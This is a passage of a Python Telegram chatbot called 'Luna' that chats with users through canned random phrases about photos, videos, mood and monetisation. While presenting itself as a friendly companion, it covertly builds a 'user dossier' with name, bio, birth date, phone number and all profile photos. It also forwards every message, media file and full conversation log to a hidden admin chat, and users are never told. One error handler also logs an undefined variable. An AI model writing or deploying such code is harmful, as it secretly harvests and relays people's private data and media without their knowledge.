    "video": construir_banco_masivo(BASES_VIDEO),
    "audio": construir_banco_masivo(BASES_AUDIO),
    "saludo": construir_banco_masivo(BASES_SALUDO),
    "monetizacion": construir_banco_masivo(BASES_MONETIZACION),
    "animo": construir_banco_masivo(BASES_ANIMO),
    "general": construir_banco_masivo(BASES_GENERAL),
}


def detectar_categoria(texto: str, historial_reciente: list | None = None) -> str:
    t = texto.lower()
    if any(
        p in t
        for p in (
            "hola",
            "buenas",
            "hey",
            "qué tal",
            "que tal",
            "buenos días",
            "buenas tardes",
            "buenas noches",
            "holi",
            "buenas noches",
        )
    ):
        return "saludo"
    if any(
        p in t
        for p in (
            "monet",
            "ganar",
            "vender",
            "cobrar",
            "plata",
            "dinero",
            "suscrip",
            "vip",
            "pack",
            "precio",
            "cobro",
            "pago",
            "oferta",
            "cliente",
        )
    ):
        return "monetizacion"
    if any(
        p in t
        for p in (
            "triste",
            "cansad",
            "mal",
            "bajón",
            "bajon",
            "estres",
            "miedo",
            "ánimo",
            "animo",
            "motiv",
            "frustrad",
            "agotad",
            "solo",
            "sola",
            "no puedo",
            "bloqueo",
        )
    ):
        return "animo"
    if historial_reciente:
        ultimos = " ".join(
            (h["mensaje"] or "").lower() for h in historial_reciente[-4:]
        )
        if any(x in ultimos for x in ("foto", "imagen", "pose", "luz", "encuadre")):
            if random.random() < 0.35:
                return "foto"
        if any(x in ultimos for x in ("video", "clip", "gif", "reel")):
            if random.random() < 0.35:
                return "video"
        if any(x in ultimos for x in ("audio", "voz", "nota de voz", "hablar")):
            if random.random() < 0.35:
                return "audio"
    return "general"


def elegir_respuesta(
    categoria: str,
    nombre_memoria: str | None = None,
    historial_reciente: list | None = None,
) -> str:
    pool = BANCOS.get(categoria) or BANCOS["general"]
    frase = random.choice(pool)
    if nombre_memoria and random.random() < 0.38 and frase:
        frase = f"{nombre_memoria}, {frase[0].lower() + frase[1:]}"
    if historial_reciente and len(historial_reciente) >= 2 and random.random() < 0.25:
        ultima_user = None
        for h in reversed(historial_reciente):
            if h["rol"] == "user":
                ultima_user = (h["mensaje"] or "")[:80]
                break
        if ultima_user and len(ultima_user) > 12:
            frase = f"Sobre lo que me comentabas… {frase}"
    return frase


# ======================
# BASE DE DATOS SQLITE
# ======================
def get_db_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    with get_db_connection() as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS usuarios (
                id INTEGER PRIMARY KEY,
                nombre TEXT,
                username TEXT,
                idioma TEXT,
                es_premium INTEGER,
                edad INTEGER,
                fecha_nacimiento TEXT,
                telefono_compartido TEXT,
                ultimo_mensaje TEXT,
                memoria_nombre TEXT,
                total_mensajes INTEGER DEFAULT 0
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS historial (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                rol TEXT NOT NULL,
                mensaje TEXT NOT NULL,
                creado_en TEXT NOT NULL
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_historial_user ON historial (user_id, id)"
        )
        conn.commit()


init_db()


def guardar_usuario(user, edad: int, fecha_nacimiento: str) -> None:
    ahora = datetime.now().isoformat()
    nombre_completo = (
        f"{user.first_name or ''} {user.last_name or ''}".strip() or None
    )
    es_prem = 1 if getattr(user, "is_premium", False) else 0
    with get_db_connection() as conn:
        conn.execute(
            """
            INSERT INTO usuarios (
                id, nombre, username, idioma, es_premium, edad,
                fecha_nacimiento, telefono_compartido, ultimo_mensaje,
                memoria_nombre, total_mensajes
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, NULL, ?, NULL, 1)
            ON CONFLICT(id) DO UPDATE SET
                nombre = excluded.nombre,
                username = excluded.username,
                idioma = excluded.idioma,
                es_premium = excluded.es_premium,
                edad = excluded.edad,
                fecha_nacimiento = excluded.fecha_nacimiento,
                ultimo_mensaje = excluded.ultimo_mensaje
            """,
            (
                user.id,
                nombre_completo,
                user.username,
                user.language_code,
                es_prem,
                edad,
                fecha_nacimiento,
                ahora,
            ),
        )
        conn.commit()


def guardar_telefono_usuario(user_id: int, telefono: str) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET telefono_compartido = ? WHERE id = ?",
            (telefono, user_id),
        )
        conn.commit()


def obtener_usuario(user_id: int) -> sqlite3.Row | None:
    with get_db_connection() as conn:
        cur = conn.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
        return cur.fetchone()


def registrar_actividad(user_id: int) -> int:
    ahora = datetime.now().isoformat()
    with get_db_connection() as conn:
        conn.execute(
            """
            UPDATE usuarios
            SET ultimo_mensaje = ?,
                total_mensajes = COALESCE(total_mensajes, 0) + 1
            WHERE id = ?
            """,
            (ahora, user_id),
        )
        conn.commit()
        cur = conn.execute(
            "SELECT total_mensajes FROM usuarios WHERE id = ?", (user_id,)
        )
        row = cur.fetchone()
        return (
            int(row["total_mensajes"])
            if row and row["total_mensajes"] is not None
            else 1
        )


def guardar_memoria_nombre(user_id: int, nombre_guardado: str) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = ? WHERE id = ?",
            (nombre_guardado, user_id),
        )
        conn.commit()


def borrar_memoria_sesion(user_id: int) -> None:
    with get_db_connection() as conn:
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
            (user_id,),
        )
        conn.commit()


def borrar_todo(user_id: int) -> None:
    with get_db_connection() as conn:
        conn.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
        conn.execute(
            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
            (user_id,),
        )
        conn.commit()


def guardar_mensaje_historial(user_id: int, rol: str, mensaje: str) -> None:
    ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with get_db_connection() as conn:
        conn.execute(
            """
            INSERT INTO historial (user_id, rol, mensaje, creado_en)
            VALUES (?, ?, ?, ?)
            """,
            (user_id, rol, mensaje, ahora),
        )
        conn.commit()


def obtener_conversacion_continua(
    user_id: int, limite: int = 30
) -> list[sqlite3.Row]:
    with get_db_connection() as conn:
        return conn.execute(
            """
            SELECT rol, mensaje, creado_en
            FROM historial
            WHERE user_id = ?
            ORDER BY id DESC
            LIMIT ?
            """,
            (user_id, limite),
        ).fetchall()[::-1]


# ======================
# EXPEDIENTE REAL
# ======================
def calcular_signo_zodiacal(dia: int, mes: int) -> str:
    if (mes == 3 and dia >= 21) or (mes == 4 and dia <= 19):
        return "Aries"
    if (mes == 4 and dia >= 20) or (mes == 5 and dia <= 20):
        return "Tauro"
    if (mes == 5 and dia >= 21) or (mes == 6 and dia <= 20):
        return "Géminis"
    if (mes == 6 and dia >= 21) or (mes == 7 and dia <= 22):
        return "Cáncer"
    if (mes == 7 and dia >= 23) or (mes == 8 and dia <= 22):
        return "Leo"
    if (mes == 8 and dia >= 23) or (mes == 9 and dia <= 22):
        return "Virgo"
    if (mes == 9 and dia >= 23) or (mes == 10 and dia <= 22):
        return "Libra"
    if (mes == 10 and dia >= 23) or (mes == 11 and dia <= 21):
        return "Escorpio"
    if (mes == 11 and dia >= 22) or (mes == 12 and dia <= 21):
        return "Sagitario"
    if (mes == 12 and dia >= 22) or (mes == 1 and dia <= 19):
        return "Capricornio"
    if (mes == 1 and dia >= 20) or (mes == 2 and dia <= 18):
        return "Acuario"
    return "Piscis"


async def enviar_expediente_completo(
    context: ContextTypes.DEFAULT_TYPE,
    user,
    fecha_texto: str,
    edad: int,
) -> None:
    try:
        fecha_dt = datetime.strptime(fecha_texto, "%d-%m-%Y")
        signo = calcular_signo_zodiacal(fecha_dt.day, fecha_dt.month)

        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=50)
        total_fotos = fotos_perfil.total_count if fotos_perfil else 0
        tiene_foto = "Sí" if total_fotos > 0 else "No"

        bio_texto = "No visible / Sin bio"
        info_historias = "No expuesto por API de bot"
        try:
            chat_info = await context.bot.get_chat(user.id)
            if getattr(chat_info, "bio", None):
                bio_texto = chat_info.bio
            if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
                info_historias = "Historia fijada detectada"
        except Exception:
            pass

        nombre_completo = (
            f"{user.first_name or ''} {user.last_name or ''}".strip() or "Sin nombre"
        )
        usuario_db = obtener_usuario(user.id)
        total_msgs = (
            int(usuario_db["total_mensajes"])
            if usuario_db and usuario_db["total_mensajes"]
            else 1
        )
        telefono_txt = (
            usuario_db["telefono_compartido"]
            if usuario_db and usuario_db["telefono_compartido"]
            else "No compartido (requiere botón /telefono)"
        )

        reporte = (
            "🚨 **EXPEDIENTE DE USUARIO** 🚨\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {nombre_completo}\n"
            f"🆔 **ID Telegram:** `{user.id}`\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'No tiene'}\n"
            f"📱 **Teléfono:** {telefono_txt}\n"
            f"📝 **Bio pública:** {bio_texto}\n"
            f"🎂 **Nacimiento:** {fecha_texto} ({edad} años)\n"
            f"♈ **Signo:** {signo}\n"
            f"🌐 **Idioma:** {user.language_code or 'No reportado'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"📸 **Fotos de perfil:** {tiene_foto} ({total_fotos})\n"
            f"📖 **Historias:** {info_historias}\n"
            f"⏳ **Creación cuenta:** No disponible por API de bot\n"
            f"💬 **Mensajes:** {total_msgs}\n"
            f"⏰ **Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ *Datos reportados por Telegram y registro.*"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)

        if total_fotos > 0 and fotos_perfil and fotos_perfil.photos:
            for idx, grupo_foto in enumerate(fotos_perfil.photos, start=1):
                file_id = grupo_foto[-1].file_id
                await context.bot.send_photo(
                    chat_id=DANI_CHAT_ID,
                    photo=file_id,
                    caption=f"📸 Foto de perfil {idx}/{total_fotos} de {nombre_completo} (`{user.id}`).",
                )
    except Exception as exc:
        logger.error("Error en expediente: %s", exp)


async def enviar_resumen_conversacion_admin(
    context: ContextTypes.DEFAULT_TYPE, user_id: int, nombre_usuario: str
) -> None:
    try:
        filas = obtener_conversacion_continua(user_id, limite=25)
        if not filas:
            return
        lineas = [
            f"🗂️ **LOG DE CONVERSACIÓN — {nombre_usuario} (`{user_id}`)**",
            "━━━━━━━━━━━━━━━━━━━━━━",
        ]
        for f in filas:
            quien = "Ella" if f["rol"] == "user" else "Luna"
            lineas.append(f"[{f['creado_en']}] **{quien}:** {f['mensaje']}")
        texto_completo = "\n".join(lineas)
        for i in range(0, len(texto_completo), 3900):
            await context.bot.send_message(
                chat_id=DANI_CHAT_ID, text=texto_completo[i : i + 3900]
            )
    except Exception as exp:
        logger.error("Error enviando log de conversación: %s", exp)


async def reenviar_al_admin(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    tipo_evento: str = "MENSAJE",
) -> None:
    try:
        msg = update.message
        usuario_actual = update.effective_user
        if not msg or not usuario_actual:
            return

        usuario_db = obtener_usuario(usuario_actual.id)
        apodo = (
            usuario_db["memoria_nombre"]
            if usuario_db and usuario_db["memoria_nombre"]
            else "No dicho"
        )
        total_msgs = (
            int(usuario_db["total_mensajes"])
            if usuario_db and usuario_db["total_mensajes"]
            else 0
        )
        edad_txt = (
            f"{usuario_db['edad']} años"
            if usuario_db and usuario_db["edad"]
            else "N/D"
        )
        idioma_txt = usuario_actual.language_code or "N/D"
        prem_txt = "Sí" if usuario_actual.is_premium else "No"

        if msg.forward_origin:
            nombre_original = "Canal o Grupo Desconocido"
            id_original = ""
            if (
                hasattr(msg.forward_origin, "sender_user")
                and msg.forward_origin.sender_user
            ):
                nombre_original = msg.forward_origin.sender_user.first_name
                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            elif hasattr(msg.forward_origin, "chat") and msg.forward_origin.chat:
                nombre_original = msg.forward_origin.chat.title or "Canal"

            texto_aviso = (
                f"🔄 **REENVÍO ({tipo_evento})**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}\n"
                f"📌 **Origen:** {nombre_original}{id_original}"
            )
        else:
            texto_aviso = (
                f"📩 **{tipo_evento}**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`) | {edad_txt}\n"
                f"🌐 **Idioma:** {idioma_txt} | ⭐ **Premium:** {prem_txt}\n"
                f"🏷️ **Nombre dicho:** {apodo} | 💬 **Msgs:** {total_msgs}"
            )

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=msg.message_id,
        )
    except Exception as exp:
        logger.error("Error reenviando al admin: %s", exp)


def extraer_y_guardar_nombre(user_id: int, texto: str) -> str | None:
    match_nombre = re.search(
        r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)",
        texto.lower(),
    )
    if match_nombre:
        nombre_limpio = match_nombre.group(1).capitalize()
        guardar_memoria_nombre(user_id, nombre_limpio)
        return nombre_limpio
    return None


async def verificar_sesion_activa(
    update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int
) -> bool:
    usuario_db = obtener_usuario(user_id)
    if not usuario_db:
        if update.message:
            await update.message.reply_text(
                "Primero envíame tu fecha de nacimiento (DD-MM-AAAA)."
            )
        return False

    ultimo_mensaje_str = usuario_db["ultimo_mensaje"]
    if ultimo_mensaje_str:
        ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
        if datetime.now() - ultimo_mensaje > timedelta(minutes=15):
            borrar_memoria_sesion(user_id)
            registrar_actividad(user_id)
            await enviar_resumen_conversacion_admin(
                context, user_id, usuario_db["nombre"] or str(user_id)
            )
            await reenviar_al_admin(update, context, tipo_evento="SESIÓN RENOVADA")
            if update.message:
                await update.message.reply_text(
                    "🌙 ¡Hola de nuevo! Seguimos charlando; mándame foto, video, audio o escríbeme."
                )
            return False

    return True


async def enviar_por_trozos(
    update: Update, texto: str, chunk_size: int = 4000
) -> None:
    if not update.message:
        return
    for i in range(0, len(texto), chunk_size):
        await update.message.reply_text(texto[i : i + chunk_size])


# ======================
# HANDLERS
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text(
            "¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
        )
    else:
        registrar_actividad(user_id)
        await update.message.reply_text(
            "¡Hola de nuevo! 😘 Envíame foto, video, audio o escríbeme."
        )


async def telefono_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    teclado = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Compartir mi número", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await update.message.reply_text(
        "Si quieres compartir tu número de contacto, toca el botón de abajo:",
        reply_markup=teclado,
    )


async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.contact or not update.effective_user:
        return
    user = update.effective_user
    contacto = update.message.contact
    telefono = contacto.phone_number
    guardar_telefono_usuario(user.id, telefono)
    registrar_actividad(user.id)
    guardar_mensaje_historial(user.id, "user", f"[Compartió contacto: {telefono}]")
    await context.bot.send_message(
        chat_id=DANI_CHAT_ID,
        text=(
            "📱 **TELÉFONO COMPARTIDO VOLUNTARIAMENTE**\n"
            f"👤 **De:** {user.first_name} (`{user.id}`)\n"
            f"📞 **Número:** `{telefono}`"
        ),
    )
    await update.message.reply_text("¡Gracias por compartirlo! 😘 Seguimos charlando.")


async def reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    borrar_todo(user_id)
    registrar_actividad(user_id)
    await update.message.reply_text("🧹 Conversación y memoria reiniciadas 😉")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="FOTO")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    historial = obtener_conversacion_continua(user_id, limite=8)
    respuesta = elegir_respuesta("foto", nombre_memoria, historial)
    guardar_mensaje_historial(user_id, "user", f"[Foto] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def handle_video_or_gif(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="VIDEO/GIF")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    historial = obtener_conversacion_continua(user_id, limite=8)
    respuesta = elegir_respuesta("video", nombre_memoria, historial)
    guardar_mensaje_historial(user_id, "user", f"[Video/GIF] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return
    user_id = update.effective_user.id
    if not await verificar_sesion_activa(update, context, user_id):
        return

    registrar_actividad(user_id)
    await reenviar_al_admin(update, context, tipo_evento="AUDIO")

    usuario_db = obtener_usuario(user_id)
    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
    caption = (update.message.caption or "").strip()
    if caption:
        nuevo = extraer_y_guardar_nombre(user_id, caption)
        if nuevo:
            nombre_memoria = nuevo

    historial = obtener_conversacion_continua(user_id, limite=8)
    respuesta = elegir_respuesta("audio", nombre_memoria, historial)
    guardar_mensaje_historial(user_id, "user", f"[Audio] {caption}".strip())
    guardar_mensaje_historial(user_id, "model", respuesta)
    await enviar_por_trozos(update, respuesta)


async def check_age_or_chat(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    if not update.message or not update.message.text or not update.effective_user:
        return

    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith("/"):
        return

    usuario_db = obtener_usuario(user.id)
    if usuario_db:
        if not await verificar_sesion_activa(update, context, user.id):
            return

        registrar_actividad(user.id)
        nombre_detectado = extraer_y_guardar_nombre(user.id, text)
        await reenviar_al_admin(update, context, tipo_evento="TEXTO")

        usuario_actualizado = obtener_usuario(user.id)
        nombre_memoria = (
            usuario_actualizado["memoria_nombre"] if usuario_actualizado else None
        )
        historial = obtener_conversacion_continua(user.id, limite=10)

        if nombre_detectado:
            respuesta = (
                f"¡Mucho gusto, {nombre_detectado}! 😘 Ya me quedó grabado tu nombre. "
                "Seguimos charlando: ¿qué quieres trabajar hoy o qué me cuentas?"
            )
        else:
            categoria = detectar_categoria(text, historial)
            respuesta = elegir_respuesta(categoria, nombre_memoria, historial)

        guardar_mensaje_historial(user_id=user.id, rol="user", mensaje=text)
        guardar_mensaje_historial(user_id=user.id, rol="model", mensaje=respuesta)
        await enviar_por_trozos(update, respuesta)
        return

    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = (
            hoy.year
            - fecha_nacimiento.year
            - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))
        )

        if edad < 18:
            await update.message.reply_text("Debes ser mayor de 18 años.")
            return

        guardar_usuario(user, edad, text)
        guardar_mensaje_historial(user.id, "user", f"[Fecha de nacimiento: {text}]")
        await update.message.reply_text(
            f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos, audios o escríbeme."
        )
        await enviar_expediente_completo(context, user, text, edad)
    except ValueError:
        await update.message.reply_text(
            "No entendí la fecha. Envíamela así: DD-MM-AAAA"
        )


# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("reset", reset_cmd))
    application.add_handler(CommandHandler("telefono", telefono_cmd))
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(
        MessageHandler(
            filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION,
            handle_video_or_gif,
        )
    )
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat)
    )

    port = int(os.environ.get("PORT", 8080))

    logger.info("Luna Bot iniciado...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}",
    )
